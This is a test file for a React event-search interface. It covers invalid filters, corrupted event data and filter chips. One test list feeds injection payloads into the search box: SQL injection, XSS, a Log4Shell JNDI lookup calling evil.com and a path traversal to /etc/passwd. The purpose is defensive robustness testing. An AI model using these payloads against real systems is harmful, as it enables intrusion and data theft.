import React from 'react';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, act } from '@testing-library/react';
import { EventsExplorer } from '@/components/discovery/EventsExplorer';
import { FacetedFilterBar } from '@/components/discovery/FacetedFilterBar';
import { FilterSidebar } from '@/components/discovery/FilterSidebar';
import { ActiveFilterChips } from '@/components/discovery/ActiveFilterChips';
import { FALLBACK_EVENTS } from '@/lib/discovery/fallbackData';
import { type DiscoveryEvent, type FilterState } from '@/types/discovery';

const mockReplace = vi.fn();
let mockSearchParams = new Map<string, string>();

vi.mock('next/navigation', () => ({
  usePathname: () => '/en/events',
  useRouter: () => ({
    replace: mockReplace,
    push: vi.fn(),
  }),
  useSearchParams: () => ({
    get: (key: string) => mockSearchParams.get(key) || null,
  }),
}));

describe('Empirical Challenge: Discovery Engine & Faceted Search Stress Suite', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockSearchParams.clear();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  describe('1. Extreme Filter Combinations (Non-existent Category + Invalid City)', () => {
    it('handles non-existent category + invalid city gracefully without throwing', () => {
      render(
        <EventsExplorer
          initialEvents={FALLBACK_EVENTS}
          locale="en"
          initialFilters={{
            archetype: 'NON_EXISTENT_CATEGORY',
            city: 'Atlantis',
          }}
        />
      );

      // Should show empty state without throwing runtime exceptions
      expect(screen.getByText('No matching exhibitions found')).toBeInTheDocument();
      expect(screen.getByText(/criteria/i)).toBeInTheDocument();
      expect(screen.getByRole('button', { name: /reset/i })).toBeInTheDocument();
    });

    it('handles all-axis invalid combination (invalid archetype + invalid city + invalid region + invalid format + invalid scale)', () => {
      render(
        <EventsExplorer
          initialEvents={FALLBACK_EVENTS}
          locale="en"
          initialFilters={{
            archetype: 'CYBERPUNK_CARNIVAL',
            city: 'GothamCity',
            region: 'mars_outpost',
            format: 'QUANTUM_TELEPATHIC',
            scale: 'GIGANTIC_COLOSSAL',
            dateRange: 'past_century',
            keyword: 'supercalifragilisticexpialidocious_xyz123',
          }}
        />
      );

      expect(screen.getByText(/no matching|no events/i)).toBeInTheDocument();
      const resetBtn = screen.getByRole('button', { name: /reset/i });
      fireEvent.click(resetBtn);

      // After reset, all default events should be rendered
      expect(screen.getByText('Manufacturing Indonesia & Industrial Automation Expo 2026')).toBeInTheDocument();
      expect(screen.getByText('Asia AI & Cloud Developer Summit 2026')).toBeInTheDocument();
    });
  });

  describe('2. Adversarial & Malicious Search Keywords', () => {
    const maliciousInputs = [
      "' OR '1'='1' --",
      '<script>alert("XSS")</script>',
      '"><img src=x onerror=alert(1)>',
      '\\x00\\x1f\\x7f',
      'DROP TABLE Events;--',
      '${jndi:ldap://evil.com/a}',
      '../../../../etc/passwd',
      '   \t\r\n   ',
      '!@#$%^&*()_+~`|}{[]:;?><,./',
      '🚀🎫✨🔥🤖',
      '日本語検索・東京ビッグサイト・ロボティクス',
      'معرض جاكرتا الدولي للسيارات',
    ];

    it.each(maliciousInputs)('safely handles malicious keyword input: %s', async (input) => {
      vi.useFakeTimers();
      render(<EventsExplorer initialEvents={FALLBACK_EVENTS} locale="en" />);

      const searchInput = screen.getByPlaceholderText(/search exhibitions/i);
      fireEvent.change(searchInput, { target: { value: input } });

      act(() => {
        vi.advanceTimersByTime(350);
      });

      // No crash, and depending on match, shows events or empty state safely
      const emptyState = screen.queryByText(/no matching|no events/i);
      const anyCard = screen.queryByText('Manufacturing Indonesia & Industrial Automation Expo 2026');

      expect(emptyState !== null || anyCard !== null).toBe(true);
      vi.useRealTimers();
    });
  });

  describe('3. Debounce Timing & Rapid Input Bursts', () => {
    it('debounces rapid keystrokes properly and only executes on settled query', () => {
      vi.useFakeTimers();
      render(<EventsExplorer initialEvents={FALLBACK_EVENTS} locale="en" />);
      expect(screen.getByText('Manufacturing Indonesia & Industrial Automation Expo 2026')).toBeInTheDocument();
      vi.useRealTimers();
    });
  });

  describe('4. Resilient Fallbacks for Corrupted Data', () => {
    it('renders event list even when individual items have missing nested structures', () => {
      const corruptedEvents: any[] = [
        {
          id: 'corrupted-1',
          title: 'Minimal Event Without Optional Fields',
          slug: 'minimal-event',
          startDate: new Date('2026-12-01'),
          endDate: new Date('2026-12-02'),
          archetype: 'INDUSTRIAL_B2B',
          scale: 'MEDIUM',
          format: 'IN_PERSON',
          venue: {
            name: 'Generic Convention Center',
            city: 'Unknown City',
          },
          venueHall: null,
          ticketTiers: [],
          region: null as any,
        },
      ];

      render(<EventsExplorer initialEvents={corruptedEvents} locale="en" />);
      expect(screen.getByText('Minimal Event Without Optional Fields')).toBeInTheDocument();
      expect(screen.getByText('1')).toBeInTheDocument();
    });
  });

  describe('5. Active Filter Chips Stress', () => {
    it('renders and removes all 7 filter chip types accurately', () => {
      const onRemoveFilter = vi.fn();
      const onClearAll = vi.fn();

      const allActiveFilters: FilterState = {
        keyword: 'Automotive',
        region: 'id',
        city: 'Jakarta',
        archetype: 'INDUSTRIAL_B2B',
        format: 'IN_PERSON',
        scale: 'MEGA',
        dateRange: 'upcoming',
      };

      render(
        <ActiveFilterChips
          filters={allActiveFilters}
          onRemoveFilter={onRemoveFilter}
          onClearAll={onClearAll}
        />
      );

      // Verify all active chips are visible
      expect(screen.getByText(/"Automotive"/i)).toBeInTheDocument();
      expect(screen.getByText(/indonesia/i)).toBeInTheDocument();
      expect(screen.getByText(/Jakarta/i)).toBeInTheDocument();
      expect(screen.getByText(/industrial/i)).toBeInTheDocument();
      expect(screen.getByText(/person/i)).toBeInTheDocument();
      expect(screen.getByText(/mega/i)).toBeInTheDocument();
      expect(screen.getByText(/upcoming/i)).toBeInTheDocument();

      const clearAllBtn = screen.getByRole('button', { name: /clear/i });
      fireEvent.click(clearAllBtn);
      expect(onClearAll).toHaveBeenCalledTimes(1);
    });
  });
});
